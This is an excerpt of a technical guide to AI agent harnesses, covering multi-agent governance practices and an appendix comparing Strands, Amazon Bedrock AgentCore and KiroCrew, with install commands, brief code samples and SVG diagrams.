<rect x="521.1" y="104.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="521.1" y="110.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="521.1" y="116.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="650.4" y="104.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="650.4" y="110.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="650.4" y="116.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="779.7" y="104.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="779.7" y="110.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="779.7" y="116.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="135.3" y="136.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">queue</text>
<text x="461.0" y="162.0" font-size="8.5" fill="#de350b" text-anchor="middle" font-weight="700">CI/CD throughput</text>
<text x="461.0" y="173.0" font-size="8.5" fill="#de350b" text-anchor="middle" font-weight="700">is the new bottleneck</text>
<line x1="331.7" y1="190.0" x2="713.6" y2="190.0" stroke="#1e7e34" stroke-width="2" marker-end="url(#f3-gr)"/>
<text x="331.7" y="185.0" font-size="8.5" fill="#1e7e34" text-anchor="start" font-weight="600">low risk, such as docs and tests: automated review, then merge</text>
<line x1="331.7" y1="214.0" x2="640.9" y2="214.0" stroke="#FF9900" stroke-width="2" marker-end="url(#f3-o)"/>
<path d="M654.9 205.0 L665.9 214.0 L654.9 223.0 L643.9 214.0 Z" fill="#fffae6" stroke="#FF9900" stroke-width="1.2"/>
<line x1="665.9" y1="214.0" x2="713.6" y2="214.0" stroke="#FF9900" stroke-width="2" marker-end="url(#f3-o)"/>
<text x="331.7" y="209.0" font-size="8.5" fill="#9a5b00" text-anchor="start" font-weight="600">high risk, such as payments and auth</text>
<text x="654.9" y="234.0" font-size="8.5" fill="#9a5b00" text-anchor="middle" font-weight="700">human approval</text>
<path d="M848.9 140 V246 H68.1 V142" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#f3-g)"/>
<rect x="330.0" y="240.0" width="252.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="249.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">incidents and traces feed the next plan</text>
<text x="0.0" y="266.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="700">GOVERNANCE, FROM THE SECOND AGENT</text>
<rect x="0.0" y="272.0" width="222.0" height="52.0" rx="6" fill="#34465c" stroke="none" stroke-width="1.2"/>
<text x="111.0" y="294.0" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="700">Coordination records</text>
<text x="111.0" y="310.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">who asked, who owns, what was tried</text>
<rect x="230.0" y="272.0" width="222.0" height="52.0" rx="6" fill="#34465c" stroke="none" stroke-width="1.2"/>
<text x="341.0" y="294.0" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="700">Memory boundaries</text>
<text x="341.0" y="310.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">what is remembered, and seen by whom</text>
<rect x="460.0" y="272.0" width="222.0" height="52.0" rx="6" fill="#34465c" stroke="none" stroke-width="1.2"/>
<text x="571.0" y="294.0" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="700">Host-enforced permissions</text>
<text x="571.0" y="310.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">what an agent may do, and where</text>
<rect x="690.0" y="272.0" width="222.0" height="52.0" rx="6" fill="#34465c" stroke="none" stroke-width="1.2"/>
<text x="801.0" y="294.0" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="700">Audit trail</text>
<text x="801.0" y="310.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">every action, where agents cannot edit</text>
</svg>
</div>

At pipeline scale, human attention is the limit again. Every session carries five duties: define its goal, start it, watch it, judge its result, and decide what happens next. Across dozens of sessions those duties are a full-time job. Stage 5 moves them to a coordinating agent that lives outside any single session. It creates, seeds, watches, and closes sessions and reacts to results across session boundaries, while the human keeps the goal. Do not start at stage 5. Write down the five duties, notice which one eats your day, and automate that one first. At larger scale one coordinator becomes a bottleneck of its own, so split coordination across agents with distinct roles, such as planning, execution, and review.

The governance problems arrive with the second agent, and none of them retrofit cheaply. Coordination must be explicit and durable, recording who asked for what, who owns which task, and what was tried and rejected. If that record lives only in a model's context, the next compaction erases it. Memory needs boundaries that define what can be remembered, by which agent, for which project, and visible to whom. Without them, one engineer's correction steers a session on another team's code. The host must enforce permissions, because a prompt can only request them. The permissions cover what an agent can do, in which repository, against which environment, and what needs a human. Every command, file change, approval, and denial must land in a record the agent cannot edit, because trust comes from a history that anyone can audit. Start the audit trail and the permission control on day one. Both are cheap to add with two sessions and expensive to add later.

Coordination also carries its own token bill, separate from the work, for keeping sessions warm, polling status, routing results, and supporting fan-out. At large session counts, that overhead can decide whether the factory is worth running. Use cheaper models for routine supervision, and replace supervision prompts with deterministic scripts wherever a script can decide. Wake sessions with minimal context instead of full history, and reuse session knowledge instead of rebuilding it. Account for cost per task and per stage, so that the expensive stage is visible.

The division of labor holds at every scale. Humans steer and agents execute. Engineers design the environment, state the intent, and build the feedback loops, and agents write the code. Expect eventual consistency rather than first-pass correctness, because most problems resolve through more loops with better inputs.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), OpenAI (A.6).

---
---

# Appendix: Seven harnesses compared

The appendix compares seven harnesses that range from a minimal template to a complete managed platform. Four are frameworks you build on, which are Strands, Pi, LangChain, and Stirrup. Three are platforms whose internals are worth studying whether or not you adopt them, which are AgentCore, KiroCrew, and OpenAI. Details are current as of September 2026. Each section opens with a coverage wheel that reuses the harness map from Part I. A dark segment means the framework builds that part in, a light segment means partial or provider-dependent support, and an empty segment means you build it. The shading is the assessment of this guide.

| Dimension          | Strands                                                | AgentCore                                  | KiroCrew                           | Pi                                 | LangChain v1                     | OpenAI                        | Stirrup                                              |
| ------------------ | ------------------------------------------------------ | ------------------------------------------ | ---------------------------------- | ---------------------------------- | -------------------------------- | ----------------------------- | ---------------------------------------------------- |
| Owner              | AWS                                                    | AWS                                        | Amazon                             | Earendil Works                     | LangChain                        | OpenAI                        | Artificial Analysis                                  |
| Shape              | SDK plus full harness                                  | Managed harness on serverless Runtime      | Local-first platform               | CLI plus packages                  | Framework plus runtime           | Three composed surfaces       | Template you modify                                  |
| Languages          | Python, TypeScript                                     | Configuration, or any framework on Runtime | JSON specs plus MCP                | TypeScript                         | Python, TypeScript               | Python, TypeScript            | Python, TypeScript                                   |
| Extension point    | Hooks, plugins, SOPs                                   | Tools, skills, lifecycle hooks             | Agent JSON plus MCP servers        | TypeScript extensions              | Middleware                       | Handoffs and capabilities     | Tools and providers                                  |
| Context management | Default on, with offloading                            | Truncation: sliding window or summary      | Session stores                     | Auto-compaction in sessions        | Middleware                       | Server-side compaction        | Default on at 0.7                                    |
| Prompt caching     | Default on, per provider                               | Provider-dependent                         | Provider-dependent                 | Provider-dependent                 | Provider-dependent               | Automatic                     | Provider-dependent                                   |
| Sandboxing         | Strands Shell, level 2                                 | microVM per session                        | Seatbelt per execution             | Documented patterns, none built in | None built in                    | Sandbox agents, levels 1 to 5 | Temp directory, Docker, or E2B backend               |
| Multi-agent        | Tools, swarms, graphs, A2A                             | A2A on Runtime, Step Functions             | Gateway-brokered dispatch          | Extensions                         | Graphs and handoffs              | Handoffs primitive            | `to_tool()` with nesting                             |
| Permissions        | Declarative binds and allowlists                       | IAM, token vault, Cedar policy             | Signed capability tokens           | Runs as the user                   | None                             | Sandbox plus approvals        | None                                                 |
| Evaluation         | Strands Evals: evaluators, simulators, chaos, red team | AgentCore Evaluations, A/B tests           | Deterministic acceptance verdicts  | `packages/evals` on vitest-evals   | AgentEvals, OpenEvals, LangSmith | SDK traces into Promptfoo     | None built in, used as the harness inside benchmarks |
| Best when          | You want strong defaults today                         | You want managed production on AWS         | You need local, auditable autonomy | You want a hackable terminal agent | You need explicit state          | You are already on OpenAI     | You want to read the whole thing                     |

## A.1 Strands Agents and Strands harness

Strands is an open-source toolkit from AWS under Apache 2.0, and it splits into three separable parts, which are an SDK, a harness, and an evaluation library. The September 2026 release added Strands harness, a fully assembled, customizable agent that you run locally or deploy anywhere, created in one line.

```python
from strands_harness import create_harness

agent = create_harness(context_manager="agentic")
```

<div class="diagram fig-split">
<div class="figure-inline">
<svg viewBox="0 0 270 236" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="wstrands-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="wstrands-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="wstrands-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="wstrands-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="wstrands-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="wstrands-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="135.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">HARNESS COVERAGE</text>
<path d="M116.7 52.8 A62 62 0 0 1 153.3 52.8 L143.3 85.3 A28 28 0 0 0 126.7 85.3 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="41.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Tools</text>
<path d="M155.0 53.3 A62 62 0 0 1 184.6 74.9 L157.4 95.2 A28 28 0 0 0 144.0 85.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="58.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Context</text>
<path d="M185.7 76.3 A62 62 0 0 1 197.0 111.1 L163.0 111.6 A28 28 0 0 0 157.9 95.9 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Caching</text>
<path d="M197.0 112.9 A62 62 0 0 1 185.7 147.7 L157.9 128.1 A28 28 0 0 0 163.0 112.4 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Memory</text>
<path d="M184.6 149.1 A62 62 0 0 1 155.0 170.7 L144.0 138.5 A28 28 0 0 0 157.4 128.8 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="172.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Bounds</text>
<path d="M153.3 171.2 A62 62 0 0 1 116.7 171.2 L126.7 138.7 A28 28 0 0 0 143.3 138.7 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="191.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Agents</text>
<path d="M115.0 170.7 A62 62 0 0 1 85.4 149.1 L112.6 128.8 A28 28 0 0 0 126.0 138.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="172.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Sandbox</text>
<path d="M84.3 147.7 A62 62 0 0 1 73.0 112.9 L107.0 112.4 A28 28 0 0 0 112.1 128.1 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Evals</text>
<path d="M73.0 111.1 A62 62 0 0 1 84.3 76.3 L112.1 95.9 A28 28 0 0 0 107.0 111.6 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Cost</text>
<path d="M85.4 74.9 A62 62 0 0 1 115.0 53.3 L126.0 85.5 A28 28 0 0 0 112.6 95.2 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="58.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Observe</text>
<circle cx="135.0" cy="112.0" r="25" fill="#0052CC"/>
<text x="135.0" y="111.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">Core</text>
<text x="135.0" y="121.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="14.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#0052CC" stroke="#0052CC" stroke-width="1"/>
<text x="30.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">built in</text>
<rect x="98.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#9dbcf0" stroke="#9dbcf0" stroke-width="1"/>
<text x="114.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">partial</text>
<rect x="182.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#ffffff" stroke="#8a96a8" stroke-width="1" stroke-dasharray="4 3"/>
<text x="198.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">yours to build</text>
</svg>
</div>
<div class="fig-arch">
<div class="arch-cols">
<div class="diagram-stack">
<div class="layer"><div class="layer-title">Entry points</div><span class="chip">your application</span><span class="chip">Strands CLI</span><span class="chip">any MCP client through strands-shell --mcp</span></div>
<div class="v-arrow">↓</div>
<div class="layer primary"><div class="layer-title">Strands harness: create_harness()</div><span class="chip">context manager and offloader</span><span class="chip">prompt caching</span><span class="chip">session resumption</span><span class="chip">subagents</span><span class="chip">skills</span><span class="chip">shell, file, web tools</span></div>
<div class="v-arrow">↓</div>
<div class="layer aws"><div class="layer-title">Strands Agents SDK</div><span class="chip">agent loop and hooks</span><span class="chip">agents-as-tools, swarms, graphs, A2A</span><span class="chip">Bedrock, Anthropic, OpenAI, Google, Ollama</span></div>
</div>
<div class="diagram-stack">
<div class="layer success"><div class="layer-title">Strands Shell</div>level-2 sandbox</div>
<div class="layer success"><div class="layer-title">Strands Evals</div>evaluators and simulators</div>
<div class="layer warn"><div class="layer-title">Harness Optimizer</div>fits prompts and skills</div>
<div class="layer warn"><div class="layer-title">Agent Control, Agent SOPs</div>guardrails and workflows</div>
</div>
</div>
<div class="diagram-caption">Runs locally or anywhere, including a session-isolated AgentCore Runtime micro-VM.</div>
</div>
</div>

Install it with `pip install strands-harness` or `npm install @strands-agents/harness`, and the Strands CLI, built on the same harness, installs with `npm install -g @strands-agents/cli`. What you get is context management on by default with automatic and agentic strategies plus a context offloader, prompt caching on by default and configured per provider, session resumption from a session ID, subagent delegation, shell and file and web tools, automatic skill loading, and the full set of multi-agent patterns covering agents-as-tools, swarms, graph workflows, and A2A. It runs models across Amazon Bedrock, Anthropic, OpenAI, Google, and local Ollama.

In [AWS benchmarks](https://strandsagents.com/blog/introducing-strands-harness/), Strands harness cost 28% less than Claude Code, Codex, and other harnesses on the same Claude and GPT models across six benchmarks, at nearly equal accuracy. With Fable 5, it cost 77% less than Claude Code and scored higher on Terminal Bench 2.1. The SDK [scored 99.95% on ARC-AGI-3](https://strandsagents.com/blog/our-production-sdk-hit-99-95-on-arc-agi-3/) in August 2026 with the same minimal harness that ships to production. Around the core sit Strands Shell for level-2 sandboxing, Strands Evals for chaos testing and red teaming, Harness Optimizer for fitting harness parameters to data, Agent Control for runtime guardrails, and Agent SOPs for markdown workflows.

Strands Evals is the most complete evaluation library of the seven. It reached 1.0 in June 2026 and installs as `strands-agents-evals`. An `Experiment` pairs `Case` objects, each holding an input, an expected output, and metadata, with a list of evaluators, and runs them against a task function.

```python
from strands_evals import Case, Experiment
from strands_evals.evaluators import OutputEvaluator

cases = [Case[str, str](name="capital", input="What is the capital of France?",
                        expected_output="Paris")]
evaluator = OutputEvaluator(rubric="Score 1.0 if the answer is correct, else 0.0.")
report = Experiment[str, str](cases=cases, evaluators=[evaluator]).run_evaluations(get_response)
```

Evaluators score at four granularities through `EvaluationLevel`, which are `OUTPUT_LEVEL`, `TOOL_LEVEL`, `TRACE_LEVEL`, and `SESSION_LEVEL`. Model-judged quality comes from `OutputEvaluator` with your own rubric, `HelpfulnessEvaluator`, and `GoalSuccessRateEvaluator`. Tool use comes from `ToolSelectionAccuracyEvaluator` and `ToolParameterAccuracyEvaluator`, and the path from `TrajectoryEvaluator`. Deterministic evaluators such as `Equals`, `ToolCalled`, and `StateEquals` run with no judge for CI. `ActorSimulator` drives goal-directed multi-turn conversations, chaos testing injects tool timeouts and corrupted responses through plugin hooks, and an experimental red-team module runs attack strategies such as Crescendo and PAIR. Traces map in from OpenTelemetry spans, which is why the library also scores agents built on other frameworks. The `strands-evals` CLI turns all of this into a CI gate. The `validate` command schema-checks an experiment file, and `run` fails the build through `--fail-on` exit-code rules. The `generate` command synthesizes starter cases from a tool description, and `diagnose` runs root-cause analysis on a failed session.

The strengths are the best defaults available and the best published evidence for them, with separable pieces you can adopt one at a time and Python and TypeScript at parity. The weakness is a large surface area carrying many named products, which takes time to navigate. Pick it when you want a production harness today and care about cost.

## A.2 Amazon Bedrock AgentCore: Runtime and harness

AgentCore is the AWS platform for running agents in production, and it offers two ways to run the loop. AgentCore Runtime is serverless hosting where the loop is your own code, in any framework or in none. You wrap the code with the `BedrockAgentCoreApp` entrypoint, package it for ARM64 or deploy the code directly, and serve it over HTTP, MCP, or A2A. The AgentCore harness is a managed loop that you declare as configuration, which means the model, the system prompt, the tools, the skills, the memory, and the limits. The harness is powered by Strands Agents and runs inside Runtime, so CloudTrail records its operations under `AWS::BedrockAgentCore::Runtime`. The two options are a spectrum rather than a fork, and the harness itself carries no separate charge.

```python
import boto3

client = boto3.client("bedrock-agentcore", region_name="us-west-2")
response = client.invoke_harness(
    harnessArn=HARNESS_ARN,
    runtimeSessionId=SESSION_ID,          # 33 characters or more, reuse it to continue
    allowedTools=["shell", "file_*"],
    messages=[{"role": "user", "content": [{"text": "Fix the failing test."}]}],
)
for event in response["stream"]:
    if "messageStop" in event:
        print(event["messageStop"]["stopReason"])
```

<div class="diagram fig-split">
<div class="figure-inline">
<svg viewBox="0 0 270 236" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="wagentcore-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="wagentcore-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="wagentcore-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="wagentcore-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="wagentcore-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="wagentcore-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="135.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">HARNESS COVERAGE</text>
<path d="M116.7 52.8 A62 62 0 0 1 153.3 52.8 L143.3 85.3 A28 28 0 0 0 126.7 85.3 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="41.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Tools</text>
<path d="M155.0 53.3 A62 62 0 0 1 184.6 74.9 L157.4 95.2 A28 28 0 0 0 144.0 85.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="58.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Context</text>
<path d="M185.7 76.3 A62 62 0 0 1 197.0 111.1 L163.0 111.6 A28 28 0 0 0 157.9 95.9 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Caching</text>
<path d="M197.0 112.9 A62 62 0 0 1 185.7 147.7 L157.9 128.1 A28 28 0 0 0 163.0 112.4 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Memory</text>
<path d="M184.6 149.1 A62 62 0 0 1 155.0 170.7 L144.0 138.5 A28 28 0 0 0 157.4 128.8 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="172.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Bounds</text>
<path d="M153.3 171.2 A62 62 0 0 1 116.7 171.2 L126.7 138.7 A28 28 0 0 0 143.3 138.7 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="191.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Agents</text>
<path d="M115.0 170.7 A62 62 0 0 1 85.4 149.1 L112.6 128.8 A28 28 0 0 0 126.0 138.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="172.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Sandbox</text>
<path d="M84.3 147.7 A62 62 0 0 1 73.0 112.9 L107.0 112.4 A28 28 0 0 0 112.1 128.1 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Evals</text>
<path d="M73.0 111.1 A62 62 0 0 1 84.3 76.3 L112.1 95.9 A28 28 0 0 0 107.0 111.6 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Cost</text>
<path d="M85.4 74.9 A62 62 0 0 1 115.0 53.3 L126.0 85.5 A28 28 0 0 0 112.6 95.2 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="58.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Observe</text>
<circle cx="135.0" cy="112.0" r="25" fill="#0052CC"/>
<text x="135.0" y="111.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">Core</text>
<text x="135.0" y="121.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="14.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#0052CC" stroke="#0052CC" stroke-width="1"/>
<text x="30.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">built in</text>
<rect x="98.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#9dbcf0" stroke="#9dbcf0" stroke-width="1"/>
<text x="114.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">partial</text>
<rect x="182.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#ffffff" stroke="#8a96a8" stroke-width="1" stroke-dasharray="4 3"/>
<text x="198.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">yours to build</text>
</svg>
</div>
<div class="fig-arch">
<div class="diagram-stack">
<div class="layer"><div class="layer-title">Entry points</div><span class="chip">invoke_harness</span><span class="chip">InvokeAgentRuntime</span><span class="chip">agentcore CLI</span><span class="chip">Step Functions InvokeHarness state</span></div>
<div class="v-arrow">↓</div>
<div class="layer primary"><div class="layer-title">AgentCore harness: the managed loop, powered by Strands Agents</div><span class="chip">model, prompt, tools, skills as configuration</span><span class="chip">limits and truncation</span><span class="chip">lifecycle hooks</span><span class="chip">versions and endpoints</span></div>
<div class="v-arrow">↓ runs inside</div>
<div class="layer aws"><div class="layer-title">AgentCore Runtime</div><span class="chip">microVM per session</span><span class="chip">filesystem and shell</span><span class="chip">your own loop in any framework</span><span class="chip">HTTP, MCP, A2A</span><span class="chip">per-second billing</span></div>
<div class="v-arrow">↓</div>
<div class="grid-3">
<div class="layer"><div class="layer-title">Memory</div>short-term events, long-term strategies per actor</div>
<div class="layer"><div class="layer-title">Gateway, Identity, Policy</div>governed MCP tools, token vault, Cedar</div>
<div class="layer"><div class="layer-title">Browser, Code Interpreter</div>managed tools the loop can call</div>
</div>
<div class="layer success"><div class="layer-title">Observability and Evaluations</div><span class="chip">CloudWatch traces from the first call</span><span class="chip">built-in evaluators</span><span class="chip">online evaluation</span><span class="chip">A/B tests</span></div>
</div>
</div>
</div>

Every session runs in its own microVM with a filesystem and a shell. A session stays warm for `idleRuntimeSessionTimeout`, 900 seconds by default, and lives at most `maxLifetime`, which is 28,800 seconds or eight hours. Short-term and long-term memory persist after a microVM is replaced, and S3 Files or EFS mounts share data across sessions and harnesses. Runtime bills per second for the CPU and memory that a session actually consumes, and it does not bill CPU while the agent waits on model or tool I/O.

The harness makes most of Part I a configuration field. Tools come in five declarative types: `remote_mcp`, `agentcore_gateway`, `agentcore_browser`, `agentcore_code_interpreter`, and `inline_function`, which hands the call back to your code for a human approval. The default `shell` and `file_operations` tools add about 900 input tokens to every model request, so scope them with `allowedTools` patterns such as `@builtin/shell` or `@git/read_*`. The limits `maxIterations`, 75 by default, `timeoutSeconds`, 3,600 by default, and `maxTokens` are configuration, and context truncation uses `sliding_window` or `summarization`. Every stream ends with a `stopReason`, and `end_turn`, `max_iterations_exceeded`, `timeout_exceeded`, `max_output_tokens_exceeded`, and `hook_stopped` each need different handling. Lifecycle hooks send `before_invocation`, `before_tool_call`, `after_tool_call`, and `after_invocation` events to Lambda, SNS, or EventBridge, and only a Lambda target can return `allow` or `deny`.

Separate services surround the loop, and the harness wires them in by configuration. Memory stores short-term events and long-term records from semantic, summarization, user-preference, and episodic strategies, scoped per actor. Gateway turns APIs, Lambda functions, and MCP servers into governed MCP tools, and a policy engine enforces Cedar policies on them in `LOG_ONLY` or `ENFORCE` mode. Identity keeps OAuth and API-key credentials in a token vault, so a remote MCP header can name a credential provider ARN that resolves only at invocation time. Browser and Code Interpreter are managed tools. Observability writes traces, logs, and metrics to CloudWatch from the first invocation. AgentCore Evaluations runs built-in evaluators such as `Builtin.Helpfulness` on demand, in batch, or online, and the harness adds A/B tests with per-session significance and recommendations for prompts and tool descriptions. Immutable versions and named endpoints make rollback a matter of pointing an endpoint at an earlier version, and the `InvokeHarness` state in Step Functions puts a harness inside a larger workflow.

Leave the harness for Runtime only when the loop needs code that configuration cannot express. That covers your own framework, graph or workflow control flow, bidirectional streaming, domain-specific pruning of a tool result, and termination on a business rule. Limits are not a reason to leave, because the harness already sets them. The harness exports to Strands code that runs on Runtime, so you can start as configuration and graduate to code without a rewrite.

The strength is that every concern from Part I is a managed service with IAM, CloudTrail, and VPC networking, and session isolation comes without any work. The costs are that it runs only on AWS, that the harness offers no choice of framework and no graph flows, and that charges spread across several meters, which are Runtime, the model, Memory, Gateway, the tools, and CloudWatch. Pick it when you need isolated multi-user sessions in production on AWS and do not want to build the substrate yourself. Start with the harness, and move to Runtime when the loop needs code.

## A.3 KiroCrew

KiroCrew is Amazon's local-first agent platform. Its API, CLI, and desktop surfaces are thin clients of one shared substrate, and that substrate implements the governance controls that chapter 13 describes.

<div class="diagram fig-split">
<div class="figure-inline">
<svg viewBox="0 0 270 236" xmlns="http://www.w3.org/2000/svg" role="img">
